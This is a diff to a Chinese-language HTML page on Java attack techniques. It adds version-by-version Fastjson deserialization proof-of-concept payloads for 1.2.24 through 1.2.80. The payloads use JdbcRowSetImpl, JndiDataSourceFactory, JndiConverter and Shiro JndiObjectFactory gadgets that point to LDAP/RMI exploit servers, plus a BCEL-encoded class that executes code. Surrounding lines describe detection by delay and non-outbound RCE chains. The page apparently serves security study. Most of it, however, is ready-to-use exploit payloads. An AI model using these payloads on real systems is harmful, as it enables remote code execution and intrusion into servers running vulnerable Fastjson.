@@ -45,7 +45,7 @@
 
 <body>
     <h1>Java攻防知识分享</h1>
-<a href="index.html">返回知识页面</a>
+    <a href="index.html">返回知识页面</a>
     <h2>JNDI注入</h2>
     <table>
         <tr>
@@ -149,8 +149,117 @@
     <p>fastjson版本<=1.2.47，可利用jdk自带链实现rce</p>
     <p>1.2.47 - 1.2.80中利用链为依赖包或本地代码，依赖包需开启autoType</p>
     <p>1.2.80后续版本暂无</p>
+    
+    <h4>一、Fastjson 1.2.24版本</h4>
+    <p>TemplatesImpl 反序列化</p>
+    <p>最终Poc为</p>
+    <pre><code>{
+    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+    "_bytecodes": ["恶意字节码"],
+    "_name": "test",
+    "_tfactory": {},
+    "_outputProperties": {},
+}</code></pre>
+    <p>JdbcRowSetImpl 反序列化</p>
+    <p>最终Poc为</p>
+    <pre><code>{  
+  "@type":"com.sun.rowset.JdbcRowSetImpl",  
+  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  
+  "autoCommit":true  
+}</code></pre>
+
+    <h4>二、Fastjson 1.2.25版本</h4>
+    <p>附上Poc</p>
+    <pre><code>{  
+  "@type":"[com.sun.rowset.JdbcRowSetImpl;",  
+  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  
+  "autoCommit":true  
+}  
+或   
+{  
+  "a":{  
+    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",  
+    "dataSourceName":"rmi://test.com:9999/TouchFile",  
+    "autoCommit":true  
+  }  
+}</code></pre>
+
+    <h4>三、Fastjson 1.2.42版本</h4>
+    <p>最终Poc，添加两个类描述符</p>
+    <pre><code>{  
+  "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",  
+  "dataSourceName":"ldap://127.0.0.1:1234/Exploit",  
+  "autoCommit":true  
+}</code></pre>
+
+    <h4>四、Fastjson 1.2.43版本</h4>
+    <p>附上poc</p>
+    <pre><code>{
+    "@type":"[com.sun.rowset.JdbcRowSetImpl"[,
+    {"dataSourceName":"ldap://127.0.0.1:1234/Exploit",
+    "autoCommit":true
+}
+或
+{
+    "b":{
+        "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
+        "dataSourceName":"rmi://test.com:9999/TouchFile",
+        "autoCommit":true
+    }
+}
+</code></pre>
+
+    <h4>五、Fastjson 1.2.45版本</h4>
+    <p>分析版本来到fastjson1.2.45，此版本升级后，存在一个黑名单匹配绕过，绕过类</p>
+    <p>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</p>
+    <p>利用条件如下</p>
+    <ul>
+        <li>目标服务端存在mybatis的jar包。</li>
+        <li>版本需为 3.x.x ～ 3.5.0</li>
+        <li>autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）</li>
+    </ul>
+    <p>Poc如下</p>
+    <pre><code>{  
+  "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",  
+  "properties":{  
+    "data_source":"ldap://127.0.0.1:1234/Exploit"  
+  }  
+}  
+或  
+{  
+  "b":{  
+    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",  
+    "properties":{"data_source":"ldap://localhost:1389/Exploit"}  
+  }  
+}</code></pre>
+
+    <h4>六、Fastjson <=1.2.62 和 <=1.2.66版本</h4>
+    <p>积累的两个poc,基于黑名单绕过fastjson <= 1.2.62</p>
+    <pre><code>{  "@type":"org.apache.xbean.propertyeditor.JndiConverter",  "AsText":"rmi://127.0.0.1:1099/exploit"}</code></pre>
+    <p>基于fastjson<=1.2.66的poc</p>
+    <pre><code>{  "@type":"org.apache.shiro.jndi.JndiObjectFactory",  "resourceName":"ldap://192.168.80.1:1389/Calc"  }</code></pre>
+
+    <h4>七、Fastjson 1.2.80版本</h4>
+    <p>构造poc如下，成功弹出计算器</p>
+    <pre><code>{
+    "a": {
+        "@type": "java.lang.Class",
+        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
+    },
+    "b": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    "c": {
+        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+        "driverClassLoader": {
+            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        "driverClassName": "$$BECL$$$l$8b$I$A$A$A$A$A$A$AeP$bbN$CA$U$3d$D$cb$O$ac$8b$bc$c47$sV$82$854v$Q$h$a3$W$e2$pb$b4$k$c6$J$Z$5cv$c92$Y$fe$c8$9aF$8d$85$l$e0G$Z$efl$M$908$c5$7d$9c$c7$bd7$f3$fd$f3$f9$F$e0$Y$7b$k8J$k$ca$a8d$b1fs$95c$9dc$83c$93$c1m$ebP$9b$T$86t$bd$f1$c0$e0$9cFO$8a$a1$d0$d1$a1$ba$9e$M$7b$w$be$X$bd$80$90l$5b$G$7f$ca$7c$d7$I$f9$7c$rF$JE$b3$Y$bcn4$89$a5$3a$d7$89TMGG$D$f1$o$7cd$91$e3$d8$f2$b1$8d$j$9a$zE$m$7d$ec$a2$c6P$b1$7c3$Qa$bfy6$95jdt$U$d2$N$e4d$u$$$b8$9b$de$40I$c3PZ$40w$93$d0$e8$n$ad$f1$fa$ca$cc$9bj$bd$d1$f9$a7i$d1N5U$92$e1$a0$be$c4vM$ac$c3$7ek$d9p$hGR$8d$c7$z$ec$c3$a5$df$b2$_$Ff$cf$a7$e8QW$a3$cc$ug$O$df$c1fT0$acPt$T$d0$K$fd$b9$f4$o$b1$C$ab$lH$95$d3op$k_$e1$5c$ce$S$yG$ba$M$f1$d6$5b$86C$d1$n$ccM$d0$3c$z$ce$T$c2$91$eap$ac$da$b1$85$e4$8e$e2$_$M$c2$l$G$cb$B$A$A"
+    }
+}</code></pre>
     <p>是否有漏洞使用延时判断，使用payload打jndi访问本地不存在的端口和类，延时了说明存在漏洞，因为延时说明进入了正常逻辑。</p>
-    <p>FastJson不出网有漏洞：RCE不出网链全部是建立在将要执行的命令文件转成BCEL,BYTE,HEX等格式用到不同的依赖进行调用执行</p>
+    <p>FastJson不出网有漏洞：RCE不出网,链全部是建立在将要执行的命令文件转成BCEL,BYTE,HEX等格式用到不同的依赖进行调用执行</p>
     <h3>1.BCEL-Tomcat&Spring链</h3>
     <p>使用jdk1.8.0_65的javac exp.java生成exp.class,再把exp.class转向BCEL字节码，把生成的BCEL字节码写入driverClassName的值，本地执行BCEL这个链造成rce</p>
     <pre><code>{
@@ -184,6 +293,7 @@
     "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
     "userOverridesAsString": "HexAsciiSerializedMap:;HEX值"
 }</code></pre>
+
 
     <h2>Shiro相关</h2>
     <p>使用的原生类writeObject序列化再使用aes加密再使用base64编码,remeberMe存在base64编码数据会先使用base64解码再aes解密再使用原生类的readObject反序列化，使用javachain项目把aes的key填上去生成非常方便</p>
